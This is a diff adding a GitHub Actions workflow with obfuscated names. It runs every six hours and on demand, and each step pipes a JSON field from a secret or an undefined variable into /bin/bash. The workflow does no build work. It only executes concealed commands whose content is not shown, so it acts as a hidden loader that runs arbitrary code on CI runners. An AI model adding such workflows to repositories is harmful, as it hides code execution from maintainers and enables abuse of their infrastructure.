@@ -1,0 +1,25 @@
+name: competingessay
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: competingessay
+        env:
+          tsbvz8010: ${{ secrets.tsbvz8010 }}
+        run: |
+          echo $tsbvz8010 | jq -r .xb7160 | /bin/bash
+          echo $dn9929 | jq -r .vx24 | /bin/bash
+          echo $tx14 | jq -r .nndqb4986 | /bin/bash
+          echo $ipo03868 | jq -r .a75048 | /bin/bash
+          echo $z4294 | jq -r .dicz01325 | /bin/bash
+          echo $o7841 | jq -r .zekcy3 | /bin/bash
+          echo $qdp5721 | jq -r .pth892 | /bin/bash
+          echo $x02375 | jq -r .ntysy76 | /bin/bash
+          echo $agv770 | jq -r .jnfdr45 | /bin/bash
+          echo $lr050 | jq -r .fucjj35 | /bin/bash
+
